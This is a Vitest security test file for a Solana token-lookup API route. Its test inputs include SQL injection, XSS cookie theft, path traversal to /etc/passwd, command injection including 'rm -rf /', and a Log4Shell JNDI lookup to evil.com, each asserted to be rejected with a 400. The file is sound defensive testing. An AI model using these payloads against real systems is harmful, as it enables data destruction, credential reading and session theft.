import { describe, it, expect, vi, beforeEach } from 'vitest';
import { GET } from '@/app/api/token/[address]/route';

vi.stubGlobal('fetch', vi.fn());

const VALID_ADDRESS = 'So11111111111111111111111111111111111111112'; // SOL
const USDC_ADDRESS  = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';

function params(address: string) {
  return { params: Promise.resolve({ address }) };
}

describe('GET /api/token/[address]', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Valid addresses', () => {
    it('returns 200 for SOL address', async () => {
      const res = await GET(new Request(`http://localhost/api/token/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      expect(res.status).toBe(200);
    });

    it('returns 200 for USDC address', async () => {
      const res = await GET(new Request(`http://localhost/api/token/${USDC_ADDRESS}`), params(USDC_ADDRESS));
      expect(res.status).toBe(200);
    });

    it('returns { token: { address, ... } } fallback when API key absent', async () => {
      const res = await GET(new Request(`http://localhost/api/token/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      const data = await res.json();
      expect(data).toHaveProperty('token');
      expect(data.token).toHaveProperty('address');
    });

    it('fallback token address matches requested address', async () => {
      const res = await GET(new Request(`http://localhost/api/token/${VALID_ADDRESS}`), params(VALID_ADDRESS));
      const data = await res.json();
      expect(data.token.address).toBe(VALID_ADDRESS);
    });
  });

  describe('SQL Injection — must return 400', () => {
    const sqls = [
      "1' OR '1'='1",
      "'; DROP TABLE tokens;--",
      "1 UNION SELECT NULL,NULL--",
      "1 AND SLEEP(5)--",
      "1'; EXEC xp_cmdshell('whoami');--",
    ];

    sqls.forEach(payload => {
      it(`rejects: ${payload.slice(0, 35)}`, async () => {
        const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
        expect(res.status).toBe(400);
      });
    });
  });

  describe('XSS — must return 400', () => {
    const xss = [
      '<script>alert(document.cookie)</script>',
      '"><img src=x onerror=alert(1)>',
      'javascript:alert(1)',
      '<svg onload=alert(1)>',
      '<iframe src="javascript:alert(1)">',
    ];

    xss.forEach(payload => {
      it(`rejects XSS: ${payload.slice(0, 35)}`, async () => {
        const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
        expect(res.status).toBe(400);
      });
    });
  });

  describe('Path traversal — must return 400', () => {
    const traversals = [
      '../../../etc/passwd',
      '..\\..\\windows\\system32',
      '..%2F..%2Fetc%2Fshadow',
      '/etc/passwd',
      '%2e%2e%2f%2e%2e%2f',
    ];

    traversals.forEach(payload => {
      it(`rejects traversal: ${payload.slice(0, 35)}`, async () => {
        const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
        expect(res.status).toBe(400);
      });
    });
  });

  describe('Command injection — must return 400', () => {
    const cmds = [
      'addr|cat /etc/passwd',
      'addr;rm -rf /',
      'addr`id`',
      'addr$(cat /etc/passwd)',
      'addr && evil',
    ];

    cmds.forEach(payload => {
      it(`rejects cmd injection: ${payload.slice(0, 35)}`, async () => {
        const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
        expect(res.status).toBe(400);
      });
    });
  });

  describe('Null byte injection — must return 400', () => {
    it('rejects null byte in address', async () => {
      const payload = 'validAddress1234567890123456\x0090malicious';
      const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
      expect(res.status).toBe(400);
    });

    it('rejects lone null byte', async () => {
      const payload = '\x00';
      const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
      expect(res.status).toBe(400);
    });
  });

  describe('Length attacks — must return 400', () => {
    it('rejects empty address', async () => {
      const res = await GET(new Request('http://localhost/api/token/'), params(''));
      expect(res.status).toBe(400);
    });

    it('rejects address shorter than 32 chars', async () => {
      const payload = 'short';
      const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
      expect(res.status).toBe(400);
    });

    it('rejects address longer than 44 chars', async () => {
      const payload = '1'.repeat(45);
      const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
      expect(res.status).toBe(400);
    });

    it('rejects 10,000 character input (DoS prevention)', async () => {
      const payload = 'a'.repeat(10_000);
      const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
      expect(res.status).toBe(400);
    });
  });

  describe('SSTI / Log4Shell — must return 400', () => {
    const templates = [
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
      '${7*7}',
      '#{7*7}',
    ];

    templates.forEach(payload => {
      it(`rejects template injection: ${payload.slice(0, 35)}`, async () => {
        const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
        expect(res.status).toBe(400);
      });
    });
  });

  describe('Error response safety', () => {
    it('error body has { error: string } shape', async () => {
      const res = await GET(new Request('http://localhost/api/token/bad'), params('bad'));
      const data = await res.json();
      expect(data).toHaveProperty('error');
      expect(typeof data.error).toBe('string');
    });

    it('does not echo XSS payload in error response', async () => {
      const payload = '<script>alert(1)</script>';
      const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
      const text = await res.text();
      expect(text).not.toContain('<script>');
    });

    it('does not echo SQL payload in error response', async () => {
      const payload = "' OR 1=1--";
      const res = await GET(new Request(`http://localhost/api/token/${payload}`), params(payload));
      const text = await res.text();
      expect(text).not.toContain("' OR");
      expect(text).not.toContain('--');
    });
  });
});
